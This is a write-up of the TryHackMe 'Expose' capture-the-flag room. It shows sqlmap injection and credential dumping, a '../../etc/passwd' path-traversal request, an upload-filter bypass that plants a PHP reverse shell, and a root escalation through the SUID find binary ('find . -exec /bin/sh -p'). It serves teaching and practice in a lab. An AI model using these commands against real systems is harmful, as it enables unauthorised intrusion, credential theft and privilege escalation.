# [Expose](https://tryhackme.com/room/expose)

######  Web, Easy - x1foideo


## Challenge Description

> Use your red teaming knowledge to pwn a Linux machine.


## Initial Recon 

#### Nmap

As usual first thing to do is a _nmap_ recognition

```bash
nmap -sS -sV -p- <IP> -o nmap
```
```
PORT     STATE SERVICE                 VERSION
21/tcp   open  ftp                     vsftpd 2.0.8 or later
22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
1883/tcp open  mosquitto version 1.6.9
```


#### WebEnumeration

Taking into consideration the services, _http_ on _port 1337_ seems quite strange, taking a look to the website we are redirected to a simple almost blank page, where everything we can see is 

> **EXPOSED**

Page Source is useless...

A good Enumeration for finding interesting paths is mandatory

```bash
gobuster dir -e -u http://<IP>:1337/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
```
```
http://10.10.80.178:1337/.htaccess            (Status: 403) [Size: 279]
http://10.10.80.178:1337/.htpasswd            (Status: 403) [Size: 279]
http://10.10.80.178:1337/admin                (Status: 301) [Size: 319] [--> http://10.10.80.178:1337/admin/]
http://10.10.80.178:1337/admin_101            (Status: 301) [Size: 323] [--> http://10.10.80.178:1337/admin_101/]
http://10.10.80.178:1337/javascript           (Status: 301) [Size: 324] [--> http://10.10.80.178:1337/javascript/]
http://10.10.80.178:1337/phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.80.178:1337/phpmyadmin/]
http://10.10.80.178:1337/server-status        (Status: 403) [Size: 279]
```

Visiting the various paths we get, the only one valid seems to be _/admin\_1010_ which redirects us to this web page:

<img src="https://github.com/x1foideo/CTFs-Writeups/blob/main/img/expose/admin_101.png?raw=true" width="600">


#### Understanding Login-Form

At first glance, since the login form gives us a username, my first idea was to bruteforce the password, however it resulted in a hole in the water.
For this reason I decided to inspect the traffic with _Burp_

**REQUEST**

```http
POST /admin_101/includes/user_login.php HTTP/1.1
Host: 10.10.80.178:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.80.178:1337/admin_101/
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 33
Origin: http://10.10.80.178:1337
DNT: 1
Connection: close
Cookie: PHPSESSID=efd8sm7q91mdnfheq8b1slak8n

email=hacker%40root.thm&password=
```

**RESPONSE**

```http
HTTP/1.1 200 OK
Date: Mon, 04 Sep 2023 14:35:56 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 111
Connection: close
Content-Type: application/json

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'hacker@root.thm'"
    ]
}
```

As we notice and easily hypothesize, we could try a _SQLi_.


## Solution

#### Dumping Info

Since we are trying a _SQLi_, why not to try with _SQLmap_
First of all save the request for using it with SQLmap and testing the _email_ parameter

```bash
sqlmap -r <path/to/file.txt> -p 'email'
```

Returning that it is injectable.

Let's dump some info

```bash
sqlmap -r <path/to/file.txt> -p 'email' --dump
```

Here we go, we got two interesting things:

1) In _expose_ DB, inside _user_ Table there's one entry:
   _email_: hacker@root.thm
   _password_: VeryDifficultPassword!!#@#@!#!@#1231

2) In _expose_ DB, inside _config_ Table there are two entries:
   _url_: /file1010111/index.php
   _password_: 69c66901194a6486176e81f5945b8929
   
   _url_: /upload-cv00101011/index.php
   _password_: // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z

Logging in, we got a new useless page

<img src="https://github.com/x1foideo/CTFs-Writeups/blob/main/img/expose/chatai.png?raw=true" width="600">

However, the paths we found are really interesting.

Following the first path (_/file1010111/index.php_) we are redirected to a login page, entering the password we got, of course, is useless as it's a hashed password.

Go to _Crackstation_ and retrieve the real password, then login.

<img src="https://github.com/x1foideo/CTFs-Writeups/blob/main/img/expose/dom.png?raw=true" width="600">

Already, quite a useless page, but it reveals in the source something interesting:

> Hint: Try file or view as GET parameters?

Let's follow the hint:

_/file1010111/index.php?file=../../../../../../etc/passwd_

Looking closely we find a user named _zeamkish_, which is a username staring with the Z. 
So moving on to the second url, we need just to insert the username.


#### File Upload

Landing on this page, it's quite obvious that the only thing we can do, and we must do, is to Upload a file.
Inspecting the source we retrieve that we are able to upload _img_ files, however, there are only simple local controls, checking only the file extension.

```js
function validate(){
  var fileInput = document.getElementById('file');
  var file = fileInput.files[0];
  
  if (file) {
    var fileName = file.name;
    var fileExtension = fileName.split('.').pop().toLowerCase();
    
    if (fileExtension === 'jpg' || fileExtension === 'png') {
      // Valid file extension, proceed with file upload
      // You can submit the form or perform further processing here
      console.log('File uploaded successfully');
	  return true;
    } else {
      // Invalid file extension, display an error message or take appropriate action
      console.log('Only JPG and PNG files are allowed');
	  return false;
    }
  }
}
```

Very easily, let's create a simple _.php_ file (using the _PHP-Monkey script_ for the reverse shell), rename it as _.png_ for bypassing the local restriction and upload it.
The real problem would be that we cannot execute an image file, for this same reason we can edit the file with burp, editing the _filename_:

- _filename="monkey.png"_ --> _filename="monkey.php"_


#### User Flag

> What is the user flag?

After uploading the file, following the hint we inspect the source and find the path where the file uploaded are saved (_/upload_thm_1001_), follow the path and then "run" the file, obtaining the rev shell (stabilize it if you want).

Cd to zeamkish folder

```bash
cd home/zeamkish
```

The problem here is we have not the permission to read the flag, but we can read _ssh\_creds.txt_ file:

```
SSH CREDS
zeamkish
easytohack@123
```

Then SSH to it and Get the first flag.


#### Root Flag

> What is the root flag?

Since we need to get access to root flag, and _zeamkish_ is not in sudoers, we need to find a way to execute root commands and retrieve the flag.

Good idea is to run:

```bash
find / -perm -4000 2>/dev/null
```

And then combine it with GTFOBins search; in fact what we found is that we can abuse of 

```
/usr/bin/find
```

In this way:

```bash
find . -exec /bin/sh -p \; -quit
cat /root/flag.txt
```

Get the second Flag


#nmap #enumeration #gobuster #sqlmap #suid #linpeas #gtfobins #find #revshell #reverseshell #fileupload #burp

